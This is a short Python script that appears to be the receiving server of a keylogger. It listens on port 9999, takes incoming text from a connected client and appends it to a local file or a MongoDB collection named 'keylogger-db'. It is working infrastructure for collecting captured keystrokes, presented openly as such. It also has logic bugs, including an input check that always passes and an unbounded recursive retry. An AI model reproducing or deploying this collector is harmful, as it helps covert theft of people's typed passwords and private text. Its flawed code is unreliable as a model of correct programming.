import socket
import pymongo

def bind_socket(host, port, s):
    try:
        s.bind((host, port))
        print("Socket binded to port: " + str(port))
        s.listen(5)
    except socket.error as msg:
        print("Socket bind error: " + str(msg) + "\nRetrying.")
        bind_socket(host, port, s)

def connect_db():
    client = pymongo.MongoClient("localhost", 27017)

    db = client["keylogger-db"]
    collection = db["keylogger-collection"]
    return db, collection

def accept_connection(s, save_type):
    conn, addr = s.accept()
    print(f"Connected to {addr[0]} on port {addr[1]}")
    receive(conn, save_type)
    conn.close()

def receive(conn, save_type):
    while True:
        response = str(conn.recv(1024), "utf-8")
        print(response, end="")
        if response == '':
            pass
        else:
            match save_type:
                case '':
                    with open("data.txt", "a")as file:
                        file.write(str(response))
                case 'txt':
                    with open("data.txt", "a")as file:
                        file.write(str(response))
                case 'db':
                    mongo = connect_db()
                    response_json = {'Text': response,}
                    mongo[1].insert_one(response_json)

def matching(tmp):
    if tmp == 'txt' or '' or 'db':
        pass
    else:
        print("Wrong input defaulting to local txt file")
        tmp = ''
    return tmp

def main():
    s = socket.socket()
    print("Socket created")
    bind_socket('', 9999, s)
    save_type = input("Please enter the desired save format:\n- Default: txt\n- db (mongodb)\n> ")

    save_type = matching(save_type)
    accept_connection(s, save_type)

main()
